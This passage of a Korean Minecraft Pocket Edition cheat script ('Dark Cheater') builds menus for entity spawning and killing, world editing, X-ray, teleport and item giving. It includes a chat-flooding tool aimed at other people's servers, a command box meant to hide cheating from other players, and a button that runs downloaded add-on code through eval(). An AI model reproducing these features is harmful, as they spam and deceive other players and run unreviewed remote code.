var animals = [];
for(var n=0;n<entCache.length;n++)
animals[n] = [];
var ents = ScriptManager.allentities;
for(var n=0;n<ents.size();n++){
for(var m=0;m<entCache.length;m++){
if(Entity.getEntityTypeId(ents.get(n))==entCache[m][1]){
animals[m].push(ents.get(n));
break;
}
}
}
if(noxT>0){
entCache.push(["Dark Tornado", "닼또라이"]);
animals.push(noxs);
}
var radio = [];
for(var n=0;n<entCache.length;n++){
radio[n] = new android.widget.RadioButton(ctx);
radio[n].setText(entCache[n][0]+"("+animals[n].length+")");
radio[n].setTextColor(white2);
radio[n].setId(n);
radios.addView(radio[n]);
}
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
entityId = entCache[checkedId][1];
}
}));
if(!hideEnt) layoutL.addView(radios);
layout.addView(layoutL);
var btnT = [];
var menusT = ["엔티티 생성 방지", "엔티티 체력 표시", "터치한 엔티티 즉사", "터치한 엔티티 체력 표시", "몹 멈추기"];
var bools = [noEnt, showMobHealth, killEnt, showEntHealth, mobStop];
for(var n in menusT){
btnT[n] = new DarkToggleButton(ctx);
btnT[n].setText(menusT[n]);
btnT[n].setId(n);
btnT[n].setChecked(bools[n]);
btnT[n].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
switch(toggle.getId()){
case 0 : 
if(onoff) Dark.toast("플레이어와 그림은 예외입니다.");
noEnt = onoff;
break;
case 1 : 
if(onoff) Dark.toast("플레이어는 예외입니다.");
showMobHealth = onoff;
break;
case 2 : 
killEnt = onoff;
break;
case 3 : 
if(onoff) Dark.toast("플레이어는 예외입니다.");
showEntHealth = onoff;
break;
case 4 : 
if(onoff) Dark.toast("플레이어는 예외입니다.");
mobStop = onoff;
break;
}
}
}));
layout.addView(btnT[n].mv());
}
var btns = [];
var menus = ["엔티티 스폰", "엔티티 삭제", "모든 엔티티 삭제", "엔티티 탑승", "엔티티 이름 짓기", "엔티티 타입 아이디", "몹 배틀", "엔티티 스폰 방지 설정"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
switch(v.getId()){
case 0 : 
if(entityId=="닼또라이"){
Dark.toast("제작자는 \"추가 기능\"에서만 소환할 수 있습니다.");
}
else{
entityTarget = entityId;
Dark.toast("해당 엔티티가 선택되었습니다.");
if(btnE!=null) btnE.dismiss();
Dark.makeEntityBtn();
}
break;
case 1 : 
if(entityId=="닼또라이"){
dtm("나를 지우려고 하다니..!");
}
else{
for each(var e in Entity.getAll()){
if(Entity.getEntityTypeId(e)==entityId) Entity.remove(e);
}
Dark.toast("해당 엔티티가 삭제되었습니다.");
}
break;
case 2 : 
for each(var e in Entity.getAll()){
if(!(Player.isPlayer(e)||Entity.getEntityTypeId(e)==83)) Entity.remove(e);
}
Dark.toast("플레이어와 그림을 제외한 모든 엔티티가 삭제되었습니다.");
break;
case 3 : 
rideEnt = true;
Dark.toast("탑승할 엔티티를 터치하세요.");
break;
case 4 : 
inputText(1);
break;
case 5 : 
var str = "";
for(var n=0;n<entCache.length;n++)
str += entCache[n][0]+" : "+entCache[n][1]+"번\n";
Dark.showDialog("엔티티 타입 아이디", str);
break;
case 6 : 
mobBattle = true;
Dark.toast("공격할 엔티티를 터치하세요...");
break;
case 7 : 
antiEntityList();
break;
}
}
});
btns[n].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
switch(v.getId()){
case 0 : 
spawnEntity();
break;
case 1 : 
if(entityId=="닼또라이"){
dtm("난 이만 가도록 하지.");
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(1500);
for(var n in noxs)
Entity.remove(noxs[n]);
clientMessage("§e<server> §0Dark Tornado§e left the Game.");
}
}).start();
}
break;
case 4 : 
for each(var e in Entity.getAll()){
if(Entity.getEntityTypeId(e)<64&&!Player.isPlayer(e)) Entity.setNameTag(e, "");
}
break;
}
return true;
}
});
layout.addView(btns[n]);
}
var exit = makeExit(menuE);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuE);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuE.setContentView(layout2);
menuE.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function worldEdit(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuWE = new android.widget.PopupWindow();
var title = makeTitle("지형 수정", menuWE);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var sws = [];
var menuS = ["월드 에딧", "터치한 블록 정보", "setTile 메니저"];
for(var n in menuS){
sws[n] = new android.widget.Switch(ctx);
sws[n].setText(menuS[n]);
sws[n].setTextColor(white2);
}
sws[0].setChecked(w.tf);
sws[1].setChecked(blockInfo);
sws[2].setChecked(sm.tf);
sws[0].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(swit, onoff){
w.tf = onoff;
}
}));
sws[1].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
blockInfo = onoff;
}
}));
sws[2].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
sm.tf = onoff;
}
}));
for(var n in menuS)
layout.addView(sws[n]);
var btns = [];
var menus = ["지점 1 입력", "지점 2 입력", "블록 설정", "블록 변경", "도움말", "월드 에딧 설정"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
switch(v.getId()){
case 0 : 
inputPoint(1);
break;
case 1 : 
inputPoint(2);
break;
case 2 : 
setDialog();
break;
case 3 : 
replaceDialog();
break;
case 4 : 
Dark.showDialog("도움말", "\"지형 수정\"과 \"월드 에딧\"은 별개의 기능입니다.\n\n블록 설정 - 지점 1과 지점 2사이의 모든 블록들을 특정한 블록으로 변경.\n블록 변경 - 지점 1과 지점 2사이의 특정한 블록들을 헤딩 블록으로 변경.\n\"월드 에딧 설정\" 버튼을 길게 누르면 \"서버원영 월드 에딧 설정\" 메뉴가 열립니다.\n\n\"setTile 메니저\"는 지점 1과 2를 setTile화(?) 시키는 기능으로, 기준점은 활로 터치한 곳입니다. 월드 에딧(지점 1, 2 선택)과 지형 수정의 setTile 메니저(기준점 선택)가 모두 켜진상태에만 작동하며, 기타 기능에 있는 추가 기능의 setTile 메니저 버튼을 터치하시면 setTile 메니저가 실행됩니다.\n파티클 도우미는 월드 에딧과 setTile 메니저가 켜져있어야 작동하며, 발광석들을 파티클로 인식합니다.");
break;
case 5 : 
worldEditSettings();
break;
}
}
});
layout.addView(btns[n]);
}
btns[5].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
worldEditManager();
return true;
}
});
var exit = makeExit(menuWE);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuWE);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuWE.setContentView(layout2);
menuWE.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function elseSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuEL = new android.widget.PopupWindow();
var title = makeTitle("기타 기능", menuEL);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = [];
var menusT = ["스크린 샷 버튼", "플레이어 좌표", "X-Ray", "시계", "등불", "채우기", "터치한 블록 캐기", "화면 뒤집기", "베드락 캐기 허용", "마인크래프트 시계", "시야 조절", "광물 확인", "자동 횃불", "미니맵", "베터리 잔량 표시", "최대 체력 오류 픽스", "내 이름표 숨기기"];
for(var n in menusT){
btnT[n] = new DarkToggleButton(ctx);
btnT[n].setText(menusT[n]);
btnT[n].setId(n);
}
if(btnSS==null) btnT[0].setChecked(false);
else btnT[0].setChecked(true);
if(p.p==null) btnT[1].setChecked(false);
else btnT[1].setChecked(true);
if(scanOre) btnT[2].setChecked(scanOre2);
else btnT[2].setChecked(xRay);
if(clock==null) btnT[3].setChecked(false);
else btnT[3].setChecked(true);
btnT[4].setChecked(light);
btnT[5].setChecked(filling);
btnT[6].setChecked(touchBlock);
btnT[7].setChecked(screenReverse);
btnT[8].setChecked(bedBreak);
if(clock2==null) btnT[9].setChecked(false);
else btnT[9].setChecked(true);
if(fovM==null) btnT[10].setChecked(false);
else btnT[10].setChecked(true);
btnT[11].setChecked(findOre);
btnT[12].setChecked(autoTorch);
if(miniMap==null) btnT[13].setChecked(false);
else btnT[13].setChecked(true);
if(bBtn==null) btnT[14].setChecked(false);
else btnT[14].setChecked(true);
btnT[15].setChecked(maxHealthFix);
btnT[16].setChecked(hideNickName);
for(var n in menusT){
btnT[n].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
switch(toggle.getId()){
case 0 : 
if(onoff){
makeScreenShotButton();
}
else{
if(btnSS!=null){
btnSS.dismiss();
btnSS = null;
}
}
break;
case 1 : 
if(onoff){
Dark.showPos();
}
else{
if(p.p!=null){
p.p.dismiss();
p.p = null;
}
}
break;
case 2 : 
if(scanOre){
if(scanOre2){
Block.setShape(2, 0, 0, 0, 1, 1, 1);
Block.setShape(3, 0, 0, 0, 1, 1, 1);
Block.setShape(87, 0, 0, 0, 1, 1, 1);
Block.setShape(14, 0, 0, 0, 1, 1, 1);
Block.setShape(15, 0, 0, 0, 1, 1, 1);
Block.setShape(16, 0, 0, 0, 1, 1, 1);
Block.setShape(56, 0, 0, 0, 1, 1, 1);
Block.setShape(73, 0, 0, 0, 1, 1, 1);
Block.setShape(74, 0, 0, 0, 1, 1, 1);
Block.setShape(129, 0, 0, 0, 1, 1, 1);
Block.setShape(153, 0, 0, 0, 1, 1, 1);
Block.setLightLevel(14, 0);
Block.setLightLevel(15, 0);
Block.setLightLevel(16, 0);
Block.setLightLevel(17, 0);
Block.setLightLevel(56, 0);
Block.setLightLevel(73, 0);
Block.setLightLevel(129, 0);
Block.setLightLevel(153, 0);
scanOre2 = false;
}
else{
Block.setShape(2, 0, 0, 0, 0, 0, 0);
Block.setShape(3, 0, 0, 0, 0, 0, 0);
Block.setShape(87, 0, 0, 0, 0, 0, 0);
Block.setShape(14, 0, 0, 0, 1, 0.999, 1);
Block.setShape(15, 0, 0, 0, 1, 0.999, 1);
Block.setShape(16, 0, 0, 0, 1, 0.999, 1);
Block.setShape(56, 0, 0, 0, 1, 0.999, 1);
Block.setShape(73, 0, 0, 0, 1, 0.999, 1);
Block.setShape(74, 0, 0, 0, 1, 0.999, 1);
Block.setShape(129, 0, 0, 0, 1, 0.999, 1);
Block.setShape(153, 0, 0, 0, 1, 0.999, 1);
Block.setLightLevel(14, 15);
Block.setLightLevel(15, 15);
Block.setLightLevel(16, 15);
Block.setLightLevel(17, 15);
Block.setLightLevel(56, 15);
Block.setLightLevel(73, 15);
Block.setLightLevel(129, 15);
Block.setLightLevel(153, 15);
scanOre2 = true;
}
Dark.toast("잘 작동하지 않는 경우는 아무 블록을 설치하시거나 파괴하시면 됩니다.")
}
else{
if(onoff){
if(mcpev4){
for(var n=0;n<256;n++){
if(Item.isValidItem(n)) Block.setRenderLayer(n, 1);
}
}
else{
xrays = [Math.round(Player.getX()-0.5), Player.getY(), Math.round(Player.getZ()-0.5)];
xrays[3] = getTile(xrays[0], xrays[1], xrays[2]);
xrays[4] = Level.getData(xrays[0], xrays[1], xrays[2]);
xrays[5] = getTile(xrays[0], xrays[1]-1, xrays[2]);
xrays[6] = Level.getData(xrays[0], xrays[1]-1, xrays[2]);
setTile(xrays[0], xrays[1], xrays[2], 89);
setTile(xrays[0], xrays[1]-1, xrays[2], 89);
}
xRay = true;
}
else{
if(mcpev4){
for(var n=0;n<256;n++){
if(Item.isValidItem(n)) Block.setRenderLayer(n, 0);
}
}
else{
setTile(xrays[0], xrays[1], xrays[2], xrays[3], xrays[4]);
setTile(xrays[0], xrays[1]-1, xrays[2], xrays[5], xrays[6]);
}
xRay = false;
}
}
break;
case 3 :
showClock(onoff); 
break;
case 4 : 
light = onoff;
setTile(lx, ly, lz, l.b[0], l.b[1]);
break;
case 5 : 
filling = onoff;
break;
case 6 : 
touchBlock = onoff;
break;
case 7 : 
if(onoff) ModPE.setFov(-65);
else ModPE.resetFov();
screenReverse = onoff;
break;
case 8 : 
bedBreak = onoff;
if(onoff) Block.setDestroyTime(7, 15);
else Block.setDestroyTime(7, -1);
break;
case 9 : 
makeMinecraftClock(onoff);
break;
case 10 : 
makeFovEditor(onoff);
break;
case 11 : 
findOre = onoff;
break;
case 12 : 
autoTorch = onoff;
break;
case 13 : 
makeMiniMap(onoff);
break;
case 14 : 
makeBatteryNotifier(onoff);
break;
case 15 : 
maxHealthFix = onoff;
break;
case 16 : 
hideNickName = onoff;
if(onoff) Entity.setNameTag(Player.getEntity(), "");
else Entity.setNameTag(Player.getEntity(), ModPE.getUserName());
break;
}
}
}));
layout.addView(btnT[n].mv());
}
var button = [];
var menus = ["명령어 입력", "명령어 목록", "웹 브라우저", "함수 실행", "음악 재생", "영상 재생", "화면 터치 방지", "지도 보기", "게임 속도 설정", "도배기"];
for(var n in menus){
button[n] = makeButton(menus[n]);
button[n].setId(n);
button[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
switch(v.getId()){
case 0 : 
inputText(5);
break;
case 1 : 
Dark.showDialog("명령어 목록", "\/day - 낮으로 설정\n\/night - 밤으로 설정\n\/dawn - 새벽으로 설정\n\/dusk - 저녁으로 설정\n\/burst n - 뼈로 터치하면 n만큼의 폭발이 발생하도록 설정\n\/remove - 뼈로 터치하면 터치한 블록이 사라지도록 설정\n\/mine - 뼈로 터치하면 터치한 블록이 캐지도록 설정\n\/ride - 뼈로 때리면 맞은 엔티티 탑승\n\/kill - 뼈로 때리면 맞은 엔티티 즉사\n\/tp x y z - 해당 좌표로 순간이동\n\/add a b c - 아이템 아이디가 a이고 아이템 데미지가 c인 아이템 b개 지급\n\/off - 뼈로 작동하는 것들 비활성화\n\/gm 0, \/survival - 서바이벌로 설정\n\/gm 1, \/creative - 크리에이티브로 설정\n\/give a b c  s - s에게 아이템 아이디가 a이고 아이템 데미지가 c인 아이템 b개 지급.(c와 s 사이는 띄어쓰기 2번).\n\/go  s - s에게 이동.(go와 s 사이는 띄어쓰기 2번)\n\/health n - 본인의 체력을 n으로 설정.\n\/time n - 시간을 n으로 설정.\n\/kill  s - s사살.(kill과 s 사이는 띄어쓰기 2번)\n\/call  s - s를 자신의 위치로 소환.(call과 s 사이는 띄어쓰기 2번).\n띄어쓰기가 2번인 경우는 맨 마지막에 플레이어의 닉네임이 오는 경우이며, 두번인 이유는 플레이어의 닉네임에 띄어쓰기가 포함될 가능성이 있기 때문입니다.\n\nOP가 사용할 수 있는 명령어는 .day, .night, .tp, .add, .give, .go, .health, .kill, .call 이 9가지 입니다. OP 권한 부여는 \"플레이어 관리\"에서 하실 수 있습니다. OP 명령어는 \/대신 .을 사용합니다. OP들은 .kill 명령어를 서버장에게 사용할 수 없습니다.\n\"플레이어 관리\"는 한 명 또는 모든 플레이어를 관리하고, \"플레이어들 관리\"의 차이는 한번에 2명 이상의 플레이어들를 관리합니다. \"플레이어들 관리\"는 \"플레이어 관리\" 버튼을 길게 누르시면 열리며, \"인벤토리 수정\" 버튼 역시 길게 누르시면 \"갑옷 슬롯 관리\"가 뜹니다\n\"밴 목록\"은 \"플레이어 관리\"를 더블 터치하면 열립니다.\n");
break;
case 2 : 
if(checkInternet()) openWeb();
else Dark.toast("인터넷에 연결되어있지 않습니다.");
break;
case 3 : 
inputText(0);
break;
case 4 : 
if(music){
media.reset();
music = false;
Dark.toast("Music off");
button[4].setText("음악 재생");
}
else{
selectMusic(sdcard, button[4]);
}
break;
case 5 : 
selectVideo(sdcard);
break;
case 6 : 
antiTouch();
Dark.toast("트리플 터치시 비활성화(또는 이전 키).");
Dark.close(true);
break;
case 7 : 
makeMap();
break;
case 8 : 
gameSpeed();
break;
case 9 : 
if(!Dark.isMulti()){
for(var n=0;n<chatTerrorN;n++){
if(showNumber) ScriptManager.nativeSendChat((n+1)+". "+chatTerrorString);
else ScriptManager.nativeSendChat(chatTerrorString);
}
}
else if(Dark.isMulti()){
if(chatTerrorCool){
if(chatTerrorN>5){
chatTerrorN = 5;
Dark.toast("타인의 서버에서는 6회 이상 반복할 수 없습니다.");
}
for(var n=0;n<chatTerrorN;n++){
if(showNumber) ScriptManager.nativeSendChat((n+1)+". "+chatTerrorString);
else ScriptManager.nativeSendChat(chatTerrorString);
if(fixSendChat){
if(showNumber) clientMessage("<"+Player.getName(ad)+"> "+(n+1)+". "+chatTerrorString);
else clientMessage("<"+Player.getName(ad)+"> "+chatTerrorString);
}
}
chatTerrorCool = false;
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(10000);
chatTerrorCool = true;
}
}).start();
}
else{
Dark.toast("타인의 서버에서는 쿨타임 10초가 적용됩니다.");
}
}
break;
}
}
});
layout.addView(button[n]);
}
if(music) button[4].setText("음악 정지");
button[9].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
chatTerrorSetting();
return true;
}
});
var btns = [];
var setting = ["기능 검색", "고스트핵", "스크립트 정보", "게임 종료"];
for(var n in setting)
btns[n] = makeButton(setting[n]);
btns[0].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
if(checkInternet()) Dark.getFuncData();
else Dark.toast("인터넷 연결이 필요합니다.");
}
});
btns[1].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
if(Dark.readAddOn("ghostHack")!="") eval(Dark.readAddOn("ghostHack"));
else Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
}
});
btns[2].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.showDialog("스크립트 정보", "스크립트 이름 : Dark Cheater\n제작자 : Dark Tornado\n스크립트 버전 : "+version+"\n스크립트 최신 버전 : "+Dark.getNewestVersion()+"\n마인크래프트 버전 : "+ModPE.getMinecraftVersion()+"\n블록런처 버전 : "+ModPE.getBlocklauncherVersion(false)+"\n블록런처 프로 버전 : "+ModPE.getBlocklauncherVersion(true)+"\n\n사용법은 버튼들만 보셔도 아실 것 같습니다(¿믕).버튼을 누르시면 토스트 메시지로 안내사항(?) 같은 것이 뜹니다. 엔티티 스폰은 해당 엔티티를 선택하고, 원하는 곳을 터치하면 스폰됩니다. \"채우기\"의 사용법은 가위로 지점 1, 2를 설정(터치)한 뒤, 원하는 블록으로 터치하시면 됩니다. \"명령어 입력\"버튼은 서버원으로 들어가서 명령어를 치면 들키기 때문에 몰래 사용할 때 사용하라고 있는 것으로, 앞에 \"\/\"는 빼고 입력해야 합니다.\n\"창고 잠금\"은 0.10.5에서만 작동합니다.\nUI를 바꾸어도 다크 치터는 그다지 많은 영향을 받지 않습니다.\n\"고스트핵\의 \"야간 투시\"는 잘 작동하지 않으며 얼음이 녹을 수 있습니다.\n\"연속 채팅 방지\"는 1초에 두 번 이상 채팅을 할 수 없도록 하는 기능으로, 해당 서버원의 폰에서는 채팅을 한 것으로 되나, 서버장의 폰에서는 채팅이 뜨지 않습니다. \"연속 채팅 방지\"에 의해 막힌 채팅 내용도 \"대화 내용 보기\"에서 확인하실 수 있습니다.\n", true);
}
});
btns[3].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
ModPE.leaveGame();
Dark.toast("Quit to Title");
}
});
btns[3].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
ModPE.leaveGame();
//return값 없어서 마크 팅긴다!!!!!
}
});
for(var n in setting)
layout.addView(btns[n]);
var exit = makeExit(menuEL);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuEL);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuEL.setContentView(layout2);
menuEL.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function addItem(tf, arr, tf2, itemId, itemDamage){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
loc1.setText("아이템 아이디 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("아이템 아이디를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number);
loc3.setText("아이템 개수 : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("아이템 개수를 입력하세요...");
loc4.setTextColor(white);
loc4.setInputType(number|number2);
if(Level.getGameMode()==1&&!tf2)
loc4.setText(5+"");
loc5.setText("아이템 데미지 : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("아이템 데미지를 입력하세요...");
loc6.setTextColor(white);
loc6.setInputType(number);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
layout.addView(loc5);
layout.addView(loc6);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
Dark.noFullScreen(loc6);
if(itemId!=null) loc2.setText(itemId+"");
if(itemDamage!=null) loc6.setText(itemDamage+"");
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("아이템 지급/설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(arr==null){
if(tf==false){
if(Level.getGameMode()==1&&tf2!=true){
Player.setInventorySlot(Player.getSelectedSlotId(), loc2.getText(), loc4.getText(), loc6.getText());
Dark.toast("설정되었습니다.");
}
else{
addItemInventory(loc2.getText(), loc4.getText(), loc6.getText());
Dark.toast("지급되었습니다.");
}
}
else if(tf==true){
Level.dropItem(Entity.getX(playerTarget), Entity.getY(playerTarget), Entity.getZ(playerTarget), 0, loc2.getText(), loc4.getText(), loc6.getText());
Dark.toast("지급되었습니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"에게 아이템이 지급되었습니다.", true);
}
}
else{
for(var n=0;n<arr.length;n++)
Level.dropItem(Entity.getX(arr[n]), Entity.getY(arr[n]), Entity.getZ(arr[n]), 0, loc2.getText(), loc4.getText(), loc6.getText());
Dark.toast("지급되었습니다.");
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function timeDialog(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("시간 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("시간을 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number);
loc2.setText(Level.getTime()+"");
var txtChanged = false;
loc2.addTextChangedListener(new android.text.TextWatcher({
onTextChanged : function(str, start, before, count){
txtChanged = true;
time.setProgress(Number(str));
}
}));
layout.addView(loc1);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var time = new android.widget.SeekBar(ctx);
if(mcpev2) time.setMax(24000);
else time.setMax(19200);
time.setProgress(Level.getTime());
time.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener({
onProgressChanged : function(seek){
if(txtChanged) txtChanged = false;
else loc2.setText(seek.getProgress()+"");
}
}));
layout.addView(time);
var layout2 = new android.widget.LinearLayout(ctx);
layout2.setOrientation(0);
layout2.setGravity(center);
var btns = [];
var menus = [" 일출 ", " 낮 ", " 일몰 ", " 밤 "];
var times = [0, 1000, 9600, 14000];
if(mcpev2) times[2] = 12000;
for(var n in menus){
btns[n] = new android.widget.Button(ctx);
btns[n].setText(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
loc2.setText(times[v.getId()]+"");
time.setProgress(times[v.getId()]);
}
});
layout2.addView(btns[n]);
}
layout.addView(layout2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("시간 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Level.setTime(loc2.getText());
Dark.toast("시간이 "+loc2.getText()+"으로 설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function playerHealth(arr){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("체력 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("체력을 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number|number2);
layout.addView(loc1);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("체력 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(arr==null){
Entity.setHealth(playerTarget, loc2.getText());
if(pca) darkMessage(Player.getName(playerTarget)+"의 체력이 "+loc2.getText()+"(으)로 설정되었습니다.", true);
}
else{
for each(var pp in arr)
Entity.setHealth(pp, loc2.getText());
}
Dark.toast("체력이 "+loc2.getText()+"(으)로 설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function playerTp(arr){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
var loc3 = new android.widget.TextView(ctx);
var loc4 = new android.widget.EditText(ctx);
var loc5 = new android.widget.TextView(ctx);
var loc6 = new android.widget.EditText(ctx);
loc1.setText("X : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("x좌표를 입력하세요...");
loc2.setTextColor(white);
loc2.setInputType(number|number2);
loc3.setText("Y : ");
loc3.setTextSize(18);
loc3.setTextColor(white);
loc4.setHint("y좌표를 입력하세요...");
loc4.setTextColor(white);
loc4.setInputType(number|number2);
loc5.setText("Z : ");
loc5.setTextSize(18);
loc5.setTextColor(white);
loc6.setHint("z좌표를 입력하세요...");
loc6.setTextColor(white);
loc6.setInputType(number|number2);
layout.addView(loc1);
layout.addView(loc2);
layout.addView(loc3);
layout.addView(loc4);
layout.addView(loc5);
layout.addView(loc6);
Dark.noFullScreen(loc2);
Dark.noFullScreen(loc4);
Dark.noFullScreen(loc6);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("플레이어 이동");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
if(arr==null){
if(playerTarget==ad){
Entity.setPosition(ad, loc2.getText(), loc4.getText(), loc6.getText());
}
else{
teleport(playerTarget, loc2.getText(), loc4.getText(), loc6.getText());
if(pca) darkMessage(Player.getName(playerTarget)+"(이)가 ("+loc2.getText()+", "+loc4.getText()+", "+loc6.getText()+")로 이동되었습니다.", true);
}
}
else{
for each(var pp in arr)
teleport(pp, loc2.getText(), loc4.getText(), loc6.getText());
}
Dark.toast("이동되었습니다("+loc2.getText()+", "+loc4.getText()+", "+loc6.getText()+").");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function gameSpeed(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc1 = new android.widget.TextView(ctx);
var loc2 = new android.widget.EditText(ctx);
loc1.setText("게임 속도 : ");
loc1.setTextSize(18);
loc1.setTextColor(white);
loc2.setHint("게임 속도를 입력하세요...");
loc2.setTextColor(white);
loc2.setText("1");
loc2.setInputType(number|number3);
layout.addView(loc1);
layout.addView(loc2);
Dark.noFullScreen(loc2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("게임 속도 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
ModPE.setGameSpeed(20*Number(loc2.getText()));
Dark.toast("게임속도가 "+Number(loc2.getText())+"배속으로 설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
